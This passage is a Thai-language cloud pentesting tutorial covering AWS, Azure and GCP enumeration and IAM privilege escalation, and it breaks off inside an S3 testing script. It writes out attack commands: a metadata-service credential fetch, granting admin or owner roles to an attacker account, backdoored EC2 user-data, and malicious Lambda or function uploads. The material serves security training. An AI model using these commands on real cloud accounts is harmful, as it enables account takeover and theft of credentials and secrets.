# Part 71: Cloud Security - การทดสอบความปลอดภัย AWS/Azure/GCP

> **ระดับ**: Professional to World-Class | **เวลาเรียน**: 10-14 ชั่วโมง

## สารบัญ
1. [Cloud Security Fundamentals](#1-cloud-security-fundamentals)
2. [AWS Security Testing](#2-aws-security-testing)
3. [Azure Security Testing](#3-azure-security-testing)
4. [GCP Security Testing](#4-gcp-security-testing)
5. [IAM Privilege Escalation](#5-iam-privilege-escalation)
6. [Storage Security (S3/Blob/GCS)](#6-storage-security)
7. [Metadata Service Exploitation](#7-metadata-service-exploitation)
8. [Serverless Security](#8-serverless-security)
9. [Container Orchestration Security](#9-container-orchestration-security)
10. [Cloud Automation Tools](#10-cloud-automation-tools)

---

## 1. Cloud Security Fundamentals

### Shared Responsibility Model

```
┌─────────────────────────────────────────────────────┐
│              SHARED RESPONSIBILITY MODEL             │
├──────────────────┬──────────────────────────────────┤
│   CUSTOMER       │   CLOUD PROVIDER                 │
│   Responsibility │   Responsibility                 │
├──────────────────┼──────────────────────────────────┤
│ Data             │ Physical Security                │
│ Applications     │ Network Infrastructure           │
│ Identity/Access  │ Hypervisor                       │
│ OS (IaaS)        │ Storage Infrastructure           │
│ Network Config   │ Host Infrastructure              │
│ Encryption       │                                  │
│ Firewall Rules   │                                  │
└──────────────────┴──────────────────────────────────┘

IaaS: Customer handles OS, runtime, middleware, apps, data
PaaS: Customer handles apps and data only
SaaS: Customer handles data and access only
```

### Cloud Attack Surface

```python
#!/usr/bin/env python3
# cloud_attack_surface.py - แผนที่ attack surface บน cloud

from dataclasses import dataclass, field
from typing import List, Dict, Optional
from enum import Enum

class CloudProvider(Enum):
    AWS = "Amazon Web Services"
    AZURE = "Microsoft Azure"
    GCP = "Google Cloud Platform"

class RiskLevel(Enum):
    CRITICAL = "Critical"
    HIGH = "High"
    MEDIUM = "Medium"
    LOW = "Low"

@dataclass
class CloudVulnerability:
    name: str
    provider: CloudProvider
    risk: RiskLevel
    description: str
    exploitation_technique: str
    remediation: str

CLOUD_ATTACK_VECTORS = [
    CloudVulnerability(
        name="Public S3 Bucket",
        provider=CloudProvider.AWS,
        risk=RiskLevel.CRITICAL,
        description="S3 bucket ที่เปิด public read/write",
        exploitation_technique="aws s3 ls s3://bucket-name --no-sign-request",
        remediation="Enable Block Public Access, use bucket policies"
    ),
    CloudVulnerability(
        name="SSRF to IMDS",
        provider=CloudProvider.AWS,
        risk=RiskLevel.CRITICAL,
        description="SSRF ที่ทำให้เข้าถึง Instance Metadata Service",
        exploitation_technique="curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        remediation="Enable IMDSv2 (require session tokens)"
    ),
    CloudVulnerability(
        name="IAM Policy Misconfiguration",
        provider=CloudProvider.AWS,
        risk=RiskLevel.HIGH,
        description="IAM roles/policies ที่กว้างเกินไป เช่น iam:* หรือ *:*",
        exploitation_technique="Enumerate permissions with enumerate-iam",
        remediation="Apply least privilege principle"
    ),
    CloudVulnerability(
        name="Azure Storage SAS Token",
        provider=CloudProvider.AZURE,
        risk=RiskLevel.HIGH,
        description="SAS token ที่ไม่มีวันหมดอายุหรือ scope กว้าง",
        exploitation_technique="Use SAS token to access blob storage",
        remediation="Use time-limited SAS tokens, rotate regularly"
    ),
    CloudVulnerability(
        name="GCP Service Account Key",
        provider=CloudProvider.GCP,
        risk=RiskLevel.CRITICAL,
        description="Service account key ที่หลุดใน code/config",
        exploitation_technique="gcloud auth activate-service-account --key-file=key.json",
        remediation="Use Workload Identity, avoid long-lived keys"
    ),
    CloudVulnerability(
        name="Kubernetes Dashboard Exposed",
        provider=CloudProvider.AWS,
        risk=RiskLevel.CRITICAL,
        description="K8s dashboard ที่เปิดสาธารณะโดยไม่มี auth",
        exploitation_technique="curl http://k8s-dashboard/api/v1/namespaces",
        remediation="Disable dashboard or use RBAC + network policies"
    ),
]

@dataclass
class CloudEngagement:
    target_provider: CloudProvider
    account_id: str
    regions: List[str]
    services_in_scope: List[str]
    credentials: Dict[str, str] = field(default_factory=dict)
    findings: List[CloudVulnerability] = field(default_factory=list)
    
    def generate_scope_summary(self) -> str:
        return f"""
=== Cloud Security Engagement ===
Provider  : {self.target_provider.value}
Account   : {self.account_id}
Regions   : {', '.join(self.regions)}
Services  : {', '.join(self.services_in_scope)}
Findings  : {len(self.findings)} vulnerabilities found
"""
```

### Cloud Pentesting Methodology

```
Phase 1: Reconnaissance
  └── OSINT (leaked keys, public buckets, DNS)
  └── Cloud asset discovery
  └── Service enumeration

Phase 2: Initial Access
  └── Credential theft (phishing, leaked keys)
  └── Exposed services exploitation
  └── Supply chain attacks

Phase 3: Privilege Escalation
  └── IAM misconfiguration abuse
  └── Role assumption chains
  └── Service account hijacking

Phase 4: Lateral Movement
  └── Cross-account access
  └── Service-to-service pivoting
  └── VPC/network traversal

Phase 5: Data Exfiltration
  └── Storage access
  └── Database dumps
  └── Secret extraction

Phase 6: Persistence
  └── Backdoor IAM users
  └── Lambda functions
  └── CloudTrail manipulation
```

---

## 2. AWS Security Testing

### AWS Environment Setup

```bash
# ติดตั้ง tools สำหรับ AWS security testing
pip3 install boto3 awscli pacu
apt install -y awscli

# Configure AWS credentials
aws configure
# AWS Access Key ID: AKIAXXXXXXXXXXXXXXXX
# AWS Secret Access Key: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
# Default region name: ap-southeast-1
# Default output format: json

# หรือใช้ environment variables
export AWS_ACCESS_KEY_ID=AKIAXXXXXXXXXXXXXXXX
export AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
export AWS_DEFAULT_REGION=ap-southeast-1

# ตรวจสอบ identity
aws sts get-caller-identity
# {
#     "UserId": "AIDAXXXXXXXXXXXXXXXX",
#     "Account": "123456789012",
#     "Arn": "arn:aws:iam::123456789012:user/test-user"
# }
```

### AWS Enumeration

```bash
# === IAM Enumeration ===
# ดู permissions ของ user ปัจจุบัน
aws iam get-user
aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)
aws iam list-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)

# List all users
aws iam list-users --query 'Users[*].[UserName,CreateDate,PasswordLastUsed]' --output table

# List all roles
aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table

# List all policies
aws iam list-policies --scope Local --query 'Policies[*].[PolicyName,Arn]' --output table

# ดู policy document
aws iam get-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \
  --version-id v1

# === EC2 Enumeration ===
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,Tags]' --output table

# Security groups
aws ec2 describe-security-groups --query 'SecurityGroups[*].[GroupId,GroupName,Description]'

# Security groups ที่เปิด port สาธารณะ
aws ec2 describe-security-groups \
  --filters "Name=ip-permission.cidr,Values=0.0.0.0/0" \
  --query 'SecurityGroups[*].[GroupId,GroupName]'

# === S3 Enumeration ===
aws s3 ls
aws s3 ls s3://bucket-name --recursive

# ตรวจสอบ bucket ACL
aws s3api get-bucket-acl --bucket bucket-name

# ตรวจสอบ bucket policy
aws s3api get-bucket-policy --bucket bucket-name

# === RDS Enumeration ===
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,PubliclyAccessible,Endpoint.Address]' --output table

# === Lambda Enumeration ===
aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role]' --output table

# ดู environment variables ของ Lambda (อาจมี secrets!)
aws lambda get-function-configuration --function-name function-name

# === Secrets Manager ===
aws secretsmanager list-secrets --query 'SecretList[*].[Name,ARN]'
aws secretsmanager get-secret-value --secret-id secret-name

# === SSM Parameter Store ===
aws ssm get-parameters-by-path --path / --recursive --with-decryption
```

### AWS Privilege Escalation Techniques

```python
#!/usr/bin/env python3
# aws_privesc.py - AWS IAM Privilege Escalation techniques

import boto3
import json
from typing import List, Dict, Tuple

class AWSPrivEscChecker:
    def __init__(self, session: boto3.Session = None):
        self.session = session or boto3.Session()
        self.iam = self.session.client('iam')
        self.sts = self.session.client('sts')
        
    def get_current_identity(self) -> Dict:
        return self.sts.get_caller_identity()
    
    def enumerate_permissions(self, username: str) -> List[str]:
        """รวบรวม permissions ทั้งหมดของ user"""
        permissions = []
        
        # Inline policies
        try:
            inline = self.iam.list_user_policies(UserName=username)
            for policy_name in inline['PolicyNames']:
                doc = self.iam.get_user_policy(UserName=username, PolicyName=policy_name)
                permissions.extend(self._extract_permissions(doc['PolicyDocument']))
        except Exception as e:
            print(f"[!] Error getting inline policies: {e}")
        
        # Attached policies
        try:
            attached = self.iam.list_attached_user_policies(UserName=username)
            for policy in attached['AttachedPolicies']:
                version = self.iam.get_policy(PolicyArn=policy['PolicyArn'])
                version_id = version['Policy']['DefaultVersionId']
                doc = self.iam.get_policy_version(
                    PolicyArn=policy['PolicyArn'],
                    VersionId=version_id
                )
                permissions.extend(self._extract_permissions(doc['PolicyVersion']['Document']))
        except Exception as e:
            print(f"[!] Error getting attached policies: {e}")
        
        return list(set(permissions))
    
    def _extract_permissions(self, policy_document: Dict) -> List[str]:
        """แยก action จาก policy document"""
        permissions = []
        for statement in policy_document.get('Statement', []):
            if statement.get('Effect') == 'Allow':
                actions = statement.get('Action', [])
                if isinstance(actions, str):
                    actions = [actions]
                permissions.extend(actions)
        return permissions
    
    def check_privesc_paths(self, permissions: List[str]) -> List[Dict]:
        """ตรวจสอบ privilege escalation paths"""
        findings = []
        
        # เทคนิค 1: CreateNewPolicyVersion
        if 'iam:CreatePolicyVersion' in permissions:
            findings.append({
                'technique': 'CreateNewPolicyVersion',
                'description': 'สร้าง policy version ใหม่ที่ให้ AdministratorAccess',
                'commands': [
                    'aws iam create-policy-version --policy-arn <ARN> --policy-document file://admin.json --set-as-default'
                ],
                'risk': 'CRITICAL'
            })
        
        # เทคนิค 2: SetDefaultPolicyVersion
        if 'iam:SetDefaultPolicyVersion' in permissions:
            findings.append({
                'technique': 'SetDefaultPolicyVersion',
                'description': 'เปลี่ยน policy version เป็น version ที่มีสิทธิ์มากกว่า',
                'commands': [
                    'aws iam list-policy-versions --policy-arn <ARN>',
                    'aws iam set-default-policy-version --policy-arn <ARN> --version-id v2'
                ],
                'risk': 'HIGH'
            })
        
        # เทคนิค 3: AttachUserPolicy
        if 'iam:AttachUserPolicy' in permissions:
            findings.append({
                'technique': 'AttachUserPolicy',
                'description': 'แนบ AdministratorAccess policy กับ user ตัวเอง',
                'commands': [
                    'aws iam attach-user-policy --user-name <USER> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess'
                ],
                'risk': 'CRITICAL'
            })
        
        # เทคนิค 4: AddUserToGroup
        if 'iam:AddUserToGroup' in permissions:
            findings.append({
                'technique': 'AddUserToGroup',
                'description': 'เพิ่ม user เข้า group ที่มีสิทธิ์ admin',
                'commands': [
                    'aws iam list-groups',
                    'aws iam add-user-to-group --group-name AdminGroup --user-name <USER>'
                ],
                'risk': 'HIGH'
            })
        
        # เทคนิค 5: Lambda function injection
        if 'lambda:UpdateFunctionCode' in permissions:
            findings.append({
                'technique': 'Lambda Function Injection',
                'description': 'แก้ไข Lambda function code เพื่อ escalate privileges',
                'commands': [
                    'aws lambda update-function-code --function-name <FUNC> --zip-file fileb://evil.zip'
                ],
                'risk': 'HIGH'
            })
        
        # เทคนิค 6: PassRole + EC2
        if 'iam:PassRole' in permissions and ('ec2:RunInstances' in permissions or 'ec2:*' in permissions):
            findings.append({
                'technique': 'PassRole + EC2',
                'description': 'สร้าง EC2 instance พร้อม IAM role ที่มีสิทธิ์สูง',
                'commands': [
                    'aws ec2 run-instances --iam-instance-profile Name=AdminRole --user-data file://backdoor.sh ...'
                ],
                'risk': 'CRITICAL'
            })
        
        # เทคนิค 7: PassRole + Lambda
        if 'iam:PassRole' in permissions and ('lambda:CreateFunction' in permissions or 'lambda:*' in permissions):
            findings.append({
                'technique': 'PassRole + Lambda',
                'description': 'สร้าง Lambda function พร้อม admin role',
                'commands': [
                    'aws lambda create-function --role arn:aws:iam::123456789012:role/AdminRole ...'
                ],
                'risk': 'CRITICAL'
            })
        
        # เทคนิค 8: Create Access Key
        if 'iam:CreateAccessKey' in permissions:
            findings.append({
                'technique': 'CreateAccessKey for Admin',
                'description': 'สร้าง access key ใหม่สำหรับ admin user',
                'commands': [
                    'aws iam create-access-key --user-name admin'
                ],
                'risk': 'CRITICAL'
            })
        
        return findings
    
    def check_assume_role_chains(self) -> List[Dict]:
        """ค้นหา role assumption chains"""
        chains = []
        try:
            roles = self.iam.list_roles()['Roles']
            for role in roles:
                trust_policy = role.get('AssumeRolePolicyDocument', {})
                for statement in trust_policy.get('Statement', []):
                    if statement.get('Effect') == 'Allow':
                        principal = statement.get('Principal', {})
                        # ตรวจสอบ wildcard principals
                        if principal == '*' or principal.get('AWS') == '*':
                            chains.append({
                                'role_arn': role['Arn'],
                                'risk': 'CRITICAL',
                                'description': 'Role อนุญาตให้ทุกคน assume ได้'
                            })
        except Exception as e:
            print(f"[!] Error: {e}")
        return chains

# ตัวอย่างการใช้งาน
if __name__ == '__main__':
    checker = AWSPrivEscChecker()
    
    identity = checker.get_current_identity()
    print(f"[*] Current identity: {identity['Arn']}")
    
    # ดึง username จาก ARN
    username = identity['Arn'].split('/')[-1]
    
    print("[*] Enumerating permissions...")
    perms = checker.enumerate_permissions(username)
    print(f"[*] Found {len(perms)} permissions")
    
    print("\n[*] Checking privilege escalation paths...")
    findings = checker.check_privesc_paths(perms)
    
    for finding in findings:
        print(f"\n[{finding['risk']}] {finding['technique']}")
        print(f"  Description: {finding['description']}")
        for cmd in finding['commands']:
            print(f"  Command: {cmd}")
```

### Pacu - AWS Exploitation Framework

```bash
# ติดตั้ง Pacu
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
pip3 install -r requirements.txt

# รัน Pacu
python3 pacu.py

# Pacu commands:
# set_keys                      - ตั้งค่า AWS credentials
# whoami                        - ดู current identity
# services                      - ดู services ที่ enumerate แล้ว
# run module_name               - รัน module

# Modules ที่มีประโยชน์:
run iam__enum_permissions
run iam__enum_users_roles_policies_groups
run iam__bruteforce_permissions
run iam__privesc_scan
run s3__bucket_finder
run ec2__enum
run lambda__enum
run secretsmanager__enum
run cloudtrail__download_event_history

# ตัวอย่าง:
run iam__privesc_scan --offline --folder /tmp/policies
```

### CloudSploit - Cloud Security Scanning

```bash
# ติดตั้ง CloudSploit
git clone https://github.com/aquasecurity/cloudsploit
cd cloudsploit
npm install

# Configure credentials
cp config_example.js config.js
# แก้ไข config.js ใส่ AWS credentials

# รัน scan
node index.js --console --csv /tmp/report.csv

# รัน specific plugins
node index.js --plugin aws/iam/iamAdminPolicy
node index.js --plugin aws/s3/bucketPublicAccessBlock

# Scout Suite - multi-cloud security auditing
pip3 install scoutsuite

scout aws --profile default --report-dir /tmp/scout-report
# เปิด report
chrome /tmp/scout-report/scoutsuite-report/scoutsuite-results/scoutsuite_results_aws-*.html
```

---

## 3. Azure Security Testing

### Azure Environment Setup

```bash
# ติดตั้ง Azure CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
pip3 install azure-cli

# Login
az login

# หรือใช้ Service Principal
az login --service-principal \
  -u <APP_ID> \
  -p <PASSWORD> \
  --tenant <TENANT_ID>

# ดู subscriptions
az account list --output table
az account set --subscription <SUBSCRIPTION_ID>

# ดู current identity
az ad signed-in-user show
```

### Azure Enumeration

```bash
# === Azure AD Enumeration ===
# List users
az ad user list --query '[*].[displayName,userPrincipalName,accountEnabled]' --output table

# List groups
az ad group list --query '[*].[displayName,mail]' --output table

# List applications
az ad app list --query '[*].[displayName,appId]' --output table

# List service principals
az ad sp list --query '[*].[displayName,appId]' --output table

# === RBAC Enumeration ===
# List role assignments
az role assignment list --all --query '[*].[principalName,roleDefinitionName,scope]' --output table

# List custom roles
az role definition list --custom-role-only true

# === Resource Enumeration ===
az resource list --output table
az vm list --output table
az storage account list --output table
az keyvault list --output table
az functionapp list --output table

# === Key Vault Enumeration ===
az keyvault list
# ถ้ามีสิทธิ์:
az keyvault secret list --vault-name MyVault
az keyvault secret show --vault-name MyVault --name SecretName

# === Storage Account ===
# ตรวจสอบ storage accounts
az storage account list --query '[*].[name,allowBlobPublicAccess,minimumTlsVersion]'

# List containers
az storage container list \
  --account-name storageaccount \
  --auth-mode login

# ตรวจสอบ public access
az storage container list \
  --account-name storageaccount \
  --query '[?properties.publicAccess!=null].[name,properties.publicAccess]'
```

### Azure Privilege Escalation

```python
#!/usr/bin/env python3
# azure_privesc.py - Azure Privilege Escalation techniques

from azure.identity import DefaultAzureCredential
from azure.mgmt.authorization import AuthorizationManagementClient
from azure.mgmt.resource import ResourceManagementClient
import subprocess
import json

class AzurePrivEscChecker:
    def __init__(self, subscription_id: str):
        self.subscription_id = subscription_id
        self.credential = DefaultAzureCredential()
        self.auth_client = AuthorizationManagementClient(self.credential, subscription_id)
        self.resource_client = ResourceManagementClient(self.credential, subscription_id)
    
    def get_current_permissions(self) -> list:
        """ดู permissions ของ current user"""
        result = subprocess.run(
            ['az', 'role', 'assignment', 'list', '--all', '--output', 'json'],
            capture_output=True, text=True
        )
        return json.loads(result.stdout)
    
    def check_privesc_techniques(self) -> list:
        """ตรวจสอบ Azure privilege escalation techniques"""
        findings = []
        
        # 1. Contributor role
        result = subprocess.run(
            ['az', 'role', 'assignment', 'list', '--role', 'Contributor', '--output', 'json'],
            capture_output=True, text=True
        )
        if 'Contributor' in result.stdout:
            findings.append({
                'technique': 'Contributor Role Abuse',
                'description': 'Contributor role อนุญาตให้สร้าง resources ใหม่ เช่น VM หรือ Function App',
                'commands': [
                    'az functionapp create --runtime python --functions-version 4 ...',
                    'az vm create --image Ubuntu2204 --admin-password Password123!'
                ]
            })
        
        # 2. Owner role
        result = subprocess.run(
            ['az', 'role', 'assignment', 'list', '--role', 'Owner', '--output', 'json'],
            capture_output=True, text=True
        )
        if result.stdout.strip() != '[]':
            findings.append({
                'technique': 'Owner Role - Add New Role Assignment',
                'description': 'Owner สามารถให้สิทธิ์ Owner แก่ user อื่นหรือ service principal ใหม่',
                'commands': [
                    'az ad sp create-for-rbac --name attacker --role Owner --scopes /subscriptions/<ID>'
                ]
            })
        
        # 3. User Access Administrator
        result = subprocess.run(
            ['az', 'role', 'assignment', 'list', '--role', 'User Access Administrator', '--output', 'json'],
            capture_output=True, text=True
        )
        if result.stdout.strip() != '[]':
            findings.append({
                'technique': 'User Access Administrator',
                'description': 'สามารถ assign role ได้ รวมถึง Owner',
                'commands': [
                    'az role assignment create --assignee <USER> --role Owner --scope /subscriptions/<ID>'
                ]
            })
        
        # 4. Azure AD Role enumeration
        result = subprocess.run(
            ['az', 'rest', '--method', 'get', 
             '--url', 'https://graph.microsoft.com/v1.0/me/memberOf',
             '--output', 'json'],
            capture_output=True, text=True
        )
        ad_roles = json.loads(result.stdout) if result.returncode == 0 else {}
        
        privileged_roles = ['Global Administrator', 'Application Administrator', 'Cloud Application Administrator']
        for role in privileged_roles:
            if role in result.stdout:
                findings.append({
                    'technique': f'Azure AD Role: {role}',
                    'description': f'{role} สามารถ manage applications และ service principals',
                    'commands': [
                        'az ad app credential reset --id <APP_ID>  # Reset app credentials',
                        'az ad sp create --id <APP_ID>  # Create service principal'
                    ]
                })
        
        return findings

# ROADtools - Azure AD enumeration
# pip3 install roadrecon
# roadrecon auth -u user@company.com -p Password123
# roadrecon gather
# roadrecon gui  # เปิด web UI
```

### MicroBurst - Azure Security Testing

```powershell
# MicroBurst PowerShell module
Install-Module -Name MicroBurst -Force
Import-Module MicroBurst

# Enumerate Azure resources
Invoke-EnumerateAzureBlobs -Base company
Invoke-EnumerateAzureSubDomains -Base company
Get-AzurePasswords
Get-AzureDomainInfo -Verbose
```

---

## 4. GCP Security Testing

### GCP Environment Setup

```bash
# ติดตั้ง gcloud CLI
curl https://sdk.cloud.google.com | bash
exec -l $SHELL
gcloud init

# Authenticate
gcloud auth login
gcloud auth activate-service-account --key-file=service-account.json

# ดู projects
gcloud projects list
gcloud config set project PROJECT_ID

# ดู current identity
gcloud auth list
gcloud config list
```

### GCP Enumeration

```bash
# === IAM Enumeration ===
# List IAM policies
gcloud projects get-iam-policy PROJECT_ID

# List service accounts
gcloud iam service-accounts list

# List service account keys
gcloud iam service-accounts keys list --iam-account SA_EMAIL

# === Compute Enumeration ===
gcloud compute instances list
gcloud compute firewall-rules list
gcloud compute networks list
gcloud compute disks list

# ตรวจสอบ firewall rules ที่เปิดสาธารณะ
gcloud compute firewall-rules list \
  --filter="direction=INGRESS AND allowed[].ports[]:22 AND sourceRanges[]:0.0.0.0/0"

# === Storage Enumeration ===
gsutil ls
gsutil ls gs://bucket-name

# ตรวจสอบ bucket permissions
gsutil iam get gs://bucket-name

# === GKE Enumeration ===
gcloud container clusters list
gcloud container clusters get-credentials CLUSTER_NAME --zone ZONE
kubectl get pods --all-namespaces

# === Secret Manager ===
gcloud secrets list
gcloud secrets versions access latest --secret=SECRET_NAME

# === Cloud Functions ===
gcloud functions list
gcloud functions describe FUNCTION_NAME

# Environment variables (อาจมี secrets)
gcloud functions describe FUNCTION_NAME --format='value(serviceConfig.environmentVariables)'
```

### GCP Privilege Escalation

```python
#!/usr/bin/env python3
# gcp_privesc.py - GCP Privilege Escalation techniques

import subprocess
import json
from typing import List, Dict

# GCP Privilege Escalation ผ่าน IAM permissions
GCP_PRIVESC_TECHNIQUES = [
    {
        'name': 'setIamPolicy on Project',
        'required_permission': 'resourcemanager.projects.setIamPolicy',
        'description': 'Grant yourself owner role',
        'commands': [
            'gcloud projects add-iam-policy-binding PROJECT_ID --member=user:attacker@gmail.com --role=roles/owner'
        ]
    },
    {
        'name': 'Service Account Key Creation',
        'required_permission': 'iam.serviceAccountKeys.create',
        'description': 'Create key for high-privilege service account',
        'commands': [
            'gcloud iam service-accounts keys create /tmp/key.json --iam-account=admin-sa@project.iam.gserviceaccount.com',
            'gcloud auth activate-service-account --key-file=/tmp/key.json'
        ]
    },
    {
        'name': 'Service Account Token Creator',
        'required_permission': 'iam.serviceAccounts.getAccessToken',
        'description': 'Get access token for another service account',
        'commands': [
            'gcloud auth print-access-token --impersonate-service-account=admin-sa@project.iam.gserviceaccount.com'
        ]
    },
    {
        'name': 'Cloud Function Deployment',
        'required_permission': 'cloudfunctions.functions.create',
        'description': 'Deploy function with admin service account',
        'commands': [
            'gcloud functions deploy evil-func --runtime python310 --service-account admin-sa@project.iam.gserviceaccount.com --trigger-http --allow-unauthenticated'
        ]
    },
    {
        'name': 'Custom Role with Escalated Permissions',
        'required_permission': 'iam.roles.create',
        'description': 'Create custom role with high privileges',
        'commands': [
            'gcloud iam roles create evilRole --project=PROJECT_ID --permissions=resourcemanager.projects.setIamPolicy'
        ]
    },
    {
        'name': 'GCS Bucket with Cloud Function Code',
        'required_permission': 'storage.objects.create',
        'description': 'Upload malicious code to bucket used by Cloud Function',
        'commands': [
            'gsutil cp evil.zip gs://function-source-bucket/function.zip',
            '# รอให้ function redeploy โดยอัตโนมัติ'
        ]
    }
]

def check_permission(permission: str) -> bool:
    """ตรวจสอบว่ามี permission หรือไม่"""
    # ใช้ gcloud CLI ตรวจสอบ
    result = subprocess.run(
        ['gcloud', 'projects', 'test-iam-permissions', 
         'PROJECT_ID',
         f'--permissions={permission}',
         '--format=json'],
        capture_output=True, text=True
    )
    data = json.loads(result.stdout)
    return permission in data.get('permissions', [])

def scan_privesc_paths():
    print("[*] Scanning GCP privilege escalation paths...")
    for technique in GCP_PRIVESC_TECHNIQUES:
        perm = technique['required_permission']
        if check_permission(perm):
            print(f"\n[FOUND] {technique['name']}")
            print(f"  Permission: {perm}")
            print(f"  Description: {technique['description']}")
            for cmd in technique['commands']:
                print(f"  Command: {cmd}")

if __name__ == '__main__':
    scan_privesc_paths()
```

### GCPBucketBrute - GCS Bucket Enumeration

```bash
# ติดตั้ง
git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute
cd GCPBucketBrute
pip3 install -r requirements.txt

# รัน enumeration
python3 gcpbucketbrute.py -k key.json -u https://storage.googleapis.com/

# ค้นหา public buckets
python3 gcpbucketbrute.py -k key.json -d company-name

# ตรวจสอบ bucket permissions ด้วย gsutil
gsutil acl get gs://bucket-name
# หา allUsers หรือ allAuthenticatedUsers
```

---

## 5. IAM Privilege Escalation

### enumerate-iam Tool

```bash
# ติดตั้ง enumerate-iam
git clone https://github.com/andresriancho/enumerate-iam.git
cd enumerate-iam
pip3 install -r requirements.txt

# Brute force permissions
python3 enumerate-iam.py \
  --access-key AKIAXXXXXXXX \
  --secret-key XXXXXXXXXXXXXXXX \
  --region ap-southeast-1

# Output:
# 2024-01-01 10:00:00,000 - 1 - [INFO] Starting permission enumeration for access-key-id "AKIAXXXXXXXX"
# 2024-01-01 10:00:01,000 - 1 - [INFO] -- Account ARN : arn:aws:iam::123456789012:user/test-user
# 2024-01-01 10:00:02,000 - 1 - [INFO] -- Account Id  : 123456789012
# 2024-01-01 10:00:05,000 - 1 - [INFO] -- Permissions found:
# 2024-01-01 10:00:05,000 - 1 - [INFO]   iam.list_users
# 2024-01-01 10:00:05,000 - 1 - [INFO]   s3.list_buckets
# 2024-01-01 10:00:05,000 - 1 - [INFO]   ec2.describe_instances
```

### IAM Assume Role Chaining

```bash
# ตรวจสอบ roles ที่ assume ได้
aws iam list-roles --query 'Roles[*].[RoleName,Arn,AssumeRolePolicyDocument]' --output json | \
  python3 -c "
import json,sys
roles = json.load(sys.stdin)
for r in roles:
    doc = r[2]
    for s in doc.get('Statement',[]):
        if s.get('Effect')=='Allow':
            print(f'Role: {r[0]}')
            print(f'ARN: {r[1]}')
            print(f'Trust: {s.get(\"Principal\",{})}\n')
"

# Assume role
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/TargetRole \
  --role-session-name AttackerSession

# ใช้ temporary credentials
export AWS_ACCESS_KEY_ID=ASIAXXXXXXXX
export AWS_SECRET_ACCESS_KEY=XXXXXXXX
export AWS_SESSION_TOKEN=XXXXXXXX

# ตรวจสอบ identity ใหม่
aws sts get-caller-identity

# Cross-account role assumption
aws sts assume-role \
  --role-arn arn:aws:iam::999999999999:role/CrossAccountRole \
  --role-session-name CrossAccountSession
```

### Automated Privilege Escalation with WeirdAAL

```bash
# WeirdAAL - AWS Attack Library
git clone https://github.com/carnal0wnage/weirdAAL.git
cd weirdAAL
pip3 install -r requirements.txt

# Setup
python3 weirdAAL.py -m ec2_describe_instances -t target-profile

# Modules
python3 weirdAAL.py -m iam_get_account_password_policy
python3 weirdAAL.py -m iam_enum_users
python3 weirdAAL.py -m lambda_list_functions
python3 weirdAAL.py -m secrets_manager_get_secrets
```

---

## 6. Storage Security

### S3 Bucket Security Testing

```python
#!/usr/bin/env python3
# s3_security_test.py - ทดสอบความปลอดภัยของ S3 buckets

import boto3
import requests
from botocore.exceptions import ClientError, NoCredentialsError
from botocore import UNSIGNED
from botocore.config import Config
from typing import List, Dict
import concurrent.futures

class S3SecurityTester:
    def __init__(self):
        # Client พร้อม credentials
        self.s3_auth = boto3.client('s3')
        # Client ไม่มี credentials (anonymous)
        self.s3_anon = boto3.client(
            's3',
            config=Config(signature_version=UNSIGNED)
        )
    
    def check_bucket_public_access(self, bucket_name: str) -> Dict:
        """ตรวจสอบ public access settings"""
        result = {
            'bucket': bucket_name,
            'tests': {}
        }
        
        # Test 1: Anonymous LIST
        try:
            self.s3_anon.list_objects_v2(Bucket=bucket_name, MaxKeys=5)
            result['tests']['anonymous_list'] = 'VULNERABLE - Public LIST enabled'
        except ClientError as e:
            code = e.response['Error']['Code']
            if code == 'NoSuchBucket':
                result['tests']['anonymous_list'] = 'Bucket does not exist'
            else:
                result['tests']['anonymous_list'] = f'Protected ({code})'
        
        # Test 2: Anonymous GET
        try:
            # ลอง GET object ที่คาดว่ามีอยู่
            for key in ['index.html', 'README.md', '.env', 'config.json']:
                try:
                    response = self.s3_anon.get_object(Bucket=bucket_name, Key=key)
                    content = response['Body'].read(100).decode(errors='replace')
                    result['tests']['anonymous_get'] = f'VULNERABLE - Can read {key}: {content[:50]}'
                    break
                except ClientError:
                    continue
            else:
                result['tests']['anonymous_get'] = 'Protected'
        except Exception as e:
            result['tests']['anonymous_get'] = f'Error: {e}'
        
        # Test 3: Anonymous PUT (เพียงทดสอบ ไม่ได้ upload จริง)
        try:
            self.s3_anon.put_object(
                Bucket=bucket_name,
                Key='security_test_file.txt',
                Body=b'security test'
            )
            result['tests']['anonymous_put'] = 'CRITICAL - Public WRITE enabled!'
            # ลบไฟล์ที่เพิ่งสร้าง
            self.s3_anon.delete_object(Bucket=bucket_name, Key='security_test_file.txt')
        except ClientError as e:
            result['tests']['anonymous_put'] = f'Protected ({e.response["Error"]["Code"]})'
        
        # Test 4: Block Public Access settings
        try:
            bpa = self.s3_auth.get_public_access_block(Bucket=bucket_name)
            config = bpa['PublicAccessBlockConfiguration']
            issues = []
            if not config.get('BlockPublicAcls'):
                issues.append('BlockPublicAcls=False')
            if not config.get('BlockPublicPolicy'):
                issues.append('BlockPublicPolicy=False')
            if not config.get('IgnorePublicAcls'):
                issues.append('IgnorePublicAcls=False')
            if not config.get('RestrictPublicBuckets'):
                issues.append('RestrictPublicBuckets=False')
            
            if issues:
                result['tests']['block_public_access'] = f'WARNING - {", ".join(issues)}'
            else:
                result['tests']['block_public_access'] = 'OK - All blocks enabled'
        except ClientError:
            result['tests']['block_public_access'] = 'Cannot check (no permission)'
        
        # Test 5: Bucket versioning
        try:
            versioning = self.s3_auth.get_bucket_versioning(Bucket=bucket_name)
            status = versioning.get('Status', 'Not enabled')
            result['tests']['versioning'] = status
        except ClientError:
            result['tests']['versioning'] = 'Cannot check'
        
        # Test 6: Bucket encryption
        try:
